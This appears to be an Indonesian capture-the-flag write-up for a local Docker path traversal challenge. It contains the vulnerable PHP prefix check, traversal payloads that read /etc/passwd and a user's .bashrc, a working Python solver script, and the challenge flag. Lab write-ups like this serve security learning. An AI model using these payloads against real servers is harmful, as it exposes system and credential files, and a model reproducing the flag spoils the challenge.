# WriteUp: Apakah Ini My...

## Overview

* **Judul:** Apakah Ini My...
* **Kategori:** File Exploitation (LFI/Path Traversal)
* **Poin:** 250
* **Deskripsi:** Bisa ngga lu menyusuri jejak si karbit?
* **Author:** (Unknown/Platform Specific)
* **URL:** `http://localhost:1337`

## Informasi Attachment

File yang diberikan adalah `karbit2.yml`.

**Struktur Direktori:**

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/File Exploitation/Apakah Ini My...]
└─$ tree
.
├── karbit2.yml
└── exploit.py

0 directories, 2 files

```

**Konten File (`karbit2.yml`):**

```yaml
services:
  web:
    image: ghcr.io/hengkerrusia/dirtrav2:latest
    ports:
      - "1337:3000"
    environment:
      - PWN=${PWN:-testuser}
    restart: unless-stopped

```

## Proses Penyelesaian

### 1. Menjalankan Environment

Challenge dijalankan menggunakan Docker Compose pada port **1337**.

**Output Terminal:**

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/File Exploitation/Apakah Ini My...]
└─$ PWN=WanZKey docker compose -f karbit2.yml up -d --build

```

### 2. Source Code Analysis (White Box)

Melakukan inspeksi file `index.php` di dalam container. Ditemukan kerentanan **Directory Traversal** akibat validasi input yang lemah.

**Snippet Vulnerable (`index.php`):**

```php
$file = isset($_GET['file']) ? $_GET['file'] : '';

if ($file) {
    // VULNERABILITY: Weak Validation
    // Hanya mengecek apakah string DIMULAI dengan '/var/www'.
    // Tidak mengecek penggunaan karakter traversal '../' setelahnya.
    if (strpos($file, '/var/www') === 0) {
        if (file_exists($file)) {
            // ... (Logic readfile)
        }
    } else {
        $content = "Error: File must be in /var/www";
    }
}

```

**Analisis Kerentanan:**

1. **Vulnerability:** Path Traversal (LFI).
2. **Logic:** Aplikasi mengizinkan akses file apa saja selama path dimulai dengan prefix `/var/www`.
3. **Bypass:** Kita dapat memanipulasi path dengan menyertakan prefix yang diminta, lalu menggunakan `../` (dot-dot-slash) untuk mundur ke direktori root dan mengakses file sistem lain.
* Valid: `/var/www/html/index.php`
* Malicious: `/var/www/../../../../etc/passwd`



### 3. Enumeration & Flag Hunting

Setelah berhasil melakukan traversal, dilakukan pencarian lokasi flag:

1. Cek `/flag`, `/root/flag.txt`, `/proc/self/environ`: **Nihil**.
2. Cek `/etc/passwd`: Ditemukan user bernama **`denji`**.
3. Cek Home Directory `/home/denji/`:
* Cek `.bash_history`: Terdapat petunjuk bahwa user pernah melakukan sesuatu dengan flag.
* Cek `.bashrc`: Ditemukan environment variable `FLAG` yang di-export di dalam file konfigurasi shell bash.



### 4. Exploitation

Mengirimkan payload traversal untuk membaca file `/home/denji/.bashrc`.

**Payload:**
`/var/www/../../../../home/denji/.bashrc`

## Script Solver

Script Python untuk mengeksploitasi celah dan mengambil flag dari `.bashrc`.

**File:** `exploit.py`

```python
import requests
import re

# Target URL (Port 1337)
URL = "http://localhost:1337"

def exploit():
    print(f"[*] Target: {URL}")
    
    # Target File: Konfigurasi bash user 'denji'
    # Lokasi ini didapat setelah enumerasi user dari /etc/passwd
    target_file = "/home/denji/.bashrc"
    
    # Payload Directory Traversal
    # Prefix /var/www/ diperlukan untuk melewati validasi strpos()
    # ../../../../ digunakan untuk kembali ke root directory
    payload = f"/var/www/../../../../{target_file}"
    
    print(f"[*] Sending Payload to retrieve: {target_file}")
    
    try:
        # Kirim GET request
        r = requests.get(URL, params={'file': payload})
        
        if r.status_code == 200:
            print("[+] Injection Successful! File content retrieved.")
            
            # Parsing konten dari dalam tag <pre> (Output HTML)
            content_match = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
            
            if content_match:
                content = content_match.group(1).strip()
                
                # Cari flag dengan regex pwn{...}
                flag_match = re.search(r'pwn\{.*?\}', content)
                
                if flag_match:
                    print("-" * 40)
                    print(f"[+] Raw Line found in .bashrc:")
                    # Menampilkan baris spesifik yang berisi flag
                    for line in content.splitlines():
                        if "pwn{" in line:
                            print(f"    {line.strip()}")
                    print("-" * 40)
                    print(f"\n[!!!] FLAG FOUND: {flag_match.group(0)}\n")
                else:
                    print("[-] File opened, but FLAG pattern not found.")
            else:
                print("[-] Could not parse <pre> content.")
        else:
            print(f"[-] HTTP Error: {r.status_code}")
            
    except Exception as e:
        print(f"[-] Connection Error: {e}")

if __name__ == "__main__":
    exploit()

```

## Output Terminal Solver

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/File Exploitation/Apakah Ini My...]
└─$ ./exploit.py
[*] Target: http://localhost:1337
[*] Sending Payload to retrieve: /home/denji/.bashrc
[+] Injection Successful! File content retrieved.
----------------------------------------
[+] Raw Line found in .bashrc:
    export FLAG=&quot;pwn{c3e709fec2c61233168578a6edd7eac3}&quot;
----------------------------------------

[!!!] FLAG FOUND: pwn{c3e709fec2c61233168578a6edd7eac3}

```

## Flag

```
pwn{c3e709fec2c61233168578a6edd7eac3}

```
